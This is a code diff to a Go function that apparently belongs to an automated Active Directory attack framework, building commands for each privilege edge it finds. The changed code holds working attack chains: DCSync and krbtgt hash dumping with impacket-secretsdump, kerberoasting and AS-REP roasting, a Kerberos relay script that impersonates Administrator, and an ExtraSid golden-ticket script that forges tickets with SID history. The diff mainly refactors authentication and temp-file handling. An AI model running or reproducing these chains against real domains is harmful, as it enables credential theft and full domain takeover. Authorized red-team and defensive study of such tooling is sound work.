@@ -303,7 +303,7 @@ func buildCommand(ctx context.Context, edge core.PrivilegeEdge, cap core.Capabil
 		}
 		return exec.CommandContext(ctx, "bloodyAD", args...), nil, nil
 
-	case strings.Contains(capLower, "generic_all"):
+	case strings.Contains(capLower, "genericall"):
 		args := []string{
 			"--host", targetIP, "-d", domain,
 			"-u", user, "-p", pass,
@@ -312,8 +312,9 @@ func buildCommand(ctx context.Context, edge core.PrivilegeEdge, cap core.Capabil
 		return exec.CommandContext(ctx, "bloodyAD", args...), nil, nil
 
 	case strings.Contains(capLower, "dcsync"):
-		targetStr := fmt.Sprintf("%s/%s:%s@%s", domain, user, pass, targetIP)
+		targetStr := buildImpacketAuth(domain, user, pass, hash, targetIP)
 		args := []string{targetStr, "-just-dc", "-dc-ip", targetIP}
+		args = append(args, impacketHashArgs(hash)...)
 		return exec.CommandContext(ctx, "impacket-secretsdump", args...), nil, nil
 
 	case strings.Contains(capLower, "cert_auth"):
@@ -342,16 +343,18 @@ func buildCommand(ctx context.Context, edge core.PrivilegeEdge, cap core.Capabil
 
 	case strings.Contains(capLower, "kerberoast"):
 		args := []string{
-			fmt.Sprintf("%s/%s:%s", domain, user, pass),
+			buildImpacketAuth(domain, user, pass, hash, targetIP),
 			"-request", "-dc-ip", targetIP,
 		}
+		args = append(args, impacketHashArgs(hash)...)
 		return exec.CommandContext(ctx, "impacket-GetUserSPNs", args...), nil, nil
 
 	case strings.Contains(capLower, "asrep_roast"):
 		args := []string{
-			fmt.Sprintf("%s/%s:%s", domain, user, pass),
+			buildImpacketAuth(domain, user, pass, hash, targetIP),
 			"-request", "-dc-ip", targetIP,
 		}
+		args = append(args, impacketHashArgs(hash)...)
 		return exec.CommandContext(ctx, "impacket-GetNPUsers", args...), nil, nil
 
 	case strings.Contains(capLower, "ldap_spray"):
@@ -441,7 +444,7 @@ func buildCommand(ctx context.Context, edge core.PrivilegeEdge, cap core.Capabil
 	case strings.Contains(capLower, "krb_relay_up"):
 		rs2, _ := tools.RandString(12)
 		script := fmt.Sprintf(`#!/bin/bash
-set -e
+set -euo pipefail
 DOMAIN=%q
 USER=%q
 PASS=%q
@@ -455,10 +458,16 @@ rbcd.py -delegate-from "$COMPNAME" -delegate-to "$TARGET" -action write "$DOMAIN
 getST.py -spn "cifs/$TARGET" -impersonate Administrator -dc-ip "$DC" "$DOMAIN/$COMPNAME:$COMPPASS"
 echo "KRBRELAY_SUCCESS"
 `, domain, user, pass, targetIP, targetIP, time.Now().UnixNano()%100000, rs2)
-		scriptPath := "/tmp/adpack_krbrelay.sh"
-		if err := os.WriteFile(scriptPath, []byte(script), 0755); err != nil {
+		f, err := os.CreateTemp("", "adpack-krbrelay-*.sh")
+		if err != nil {
+			return nil, nil, fmt.Errorf("create temp script: %w", err)
+		}
+		scriptPath := f.Name()
+		if err := os.WriteFile(scriptPath, []byte(script), 0600); err != nil {
+			os.Remove(scriptPath)
 			return nil, nil, fmt.Errorf("write krbrelay script: %w", err)
 		}
+		f.Close()
 		cleanup := func() { os.Remove(scriptPath) }
 		return exec.CommandContext(ctx, "bash", scriptPath), cleanup, nil
 
@@ -482,15 +491,6 @@ echo "KRBRELAY_SUCCESS"
 		return exec.CommandContext(ctx, "impacket-getST", args...), nil, nil
 
 	case strings.Contains(capLower, "extra_sid_golden_ticket"):
-		// Multi-step ExtraSid trust escalation:
-		//   1. impacket-secretsdump -just-dc-user krbtgt <child_dc>
-		//   2. impacket-lookupsid <child_dc> 0 → child domain SID
-		//   3. impacket-lookupsid <parent_dc> 0 → parent domain SID + EA RID 519
-		//   4. impacket-ticketer -sid-history <parent_EA_SID> ...
-		//
-		// We write a temp shell script because the chain involves multiple tools
-		// that share state (krbtgt hash, domain SIDs). The script emits a
-		// TICKET_SUCCESS: line on completion for the reconciliation layer.
 		childDomain := domain
 		parts := strings.SplitN(childDomain, ".", 2)
 		parentDomain := childDomain
@@ -499,7 +499,6 @@ echo "KRBRELAY_SUCCESS"
 		}
 		childDC := targetIP
 
-		// Build the multi-step script
 		script := fmt.Sprintf(`#!/bin/bash
 set -euo pipefail
 CHILD_DOMAIN=%q
@@ -530,7 +529,6 @@ hash_args() {
 AUTH=$(build_auth "$CHILD_DOMAIN" "$HASH" "$CHILD_DC" "$USER" "$PASS")
 HASH_ARGS=$(hash_args "$HASH")
 
-# Step 1: secretsdump krbtgt
 echo "=== STEP 1: secretsdump krbtgt ==="
 SD_OUT=$(impacket-secretsdump "$AUTH" -just-dc-user krbtgt $HASH_ARGS 2>&1)
 echo "$SD_OUT"
@@ -541,7 +539,6 @@ if [ -z "$KRBTGT_HASH" ]; then
 fi
 echo "KRBTGT_HASH=${KRBTGT_HASH}"
 
-# Step 2: lookupsid child domain
 echo "=== STEP 2: lookupsid child domain ==="
 LS_OUT=$(impacket-lookupsid "$AUTH" 0 $HASH_ARGS 2>&1)
 echo "$LS_OUT"
@@ -552,9 +549,7 @@ if [ -z "$CHILD_SID" ]; then
 fi
 echo "CHILD_SID=${CHILD_SID}"
 
-# Step 3: resolve parent DC + lookupsid parent domain
 echo "=== STEP 3: lookupsid parent domain ==="
-# Try DNS SRV resolution for parent DC; fall back to guessing
 PARENT_DC=$(host -t SRV _ldap._tcp.dc._msdcs.${PARENT_DOMAIN} 2>/dev/null | grep -oP "\S+\.${PARENT_DOMAIN}\." | head -1 | sed "s/\.$//")
 if [ -z "$PARENT_DC" ]; then
   PARENT_DC=$(echo "$PARENT_DOMAIN" | cut -d. -f1)
@@ -573,7 +568,6 @@ PARENT_EA_SID="${PARENT_SID}-519"
 echo "PARENT_SID=${PARENT_SID}"
 echo "PARENT_EA_SID=${PARENT_EA_SID}"
 
-# Step 4: forge golden ticket with SID history
 echo "=== STEP 4: impacket-ticketer with SID history ==="
 TK_OUT=$(impacket-ticketer -nthash "$KRBTGT_HASH" -domain-sid "$CHILD_SID" -domain "$CHILD_DOMAIN" -sid-history "$PARENT_EA_SID" "$FAKE_USER" 2>&1)
 echo "$TK_OUT"
@@ -590,10 +584,16 @@ else
 fi
 `, childDomain, parentDomain, childDC, user, pass, hash)
 
-		scriptPath := "/tmp/adpack_extrasid.sh"
-		if err := os.WriteFile(scriptPath, []byte(script), 0755); err != nil {
+		f, err := os.CreateTemp("", "adpack-extrasid-*.sh")
+		if err != nil {
+			return nil, nil, fmt.Errorf("create temp script: %w", err)
+		}
+		scriptPath := f.Name()
+		if err := os.WriteFile(scriptPath, []byte(script), 0600); err != nil {
+			os.Remove(scriptPath)
 			return nil, nil, fmt.Errorf("write extrasid script: %w", err)
 		}
+		f.Close()
 		cleanup := func() { os.Remove(scriptPath) }
 		return exec.CommandContext(ctx, "bash", scriptPath), cleanup, nil
 
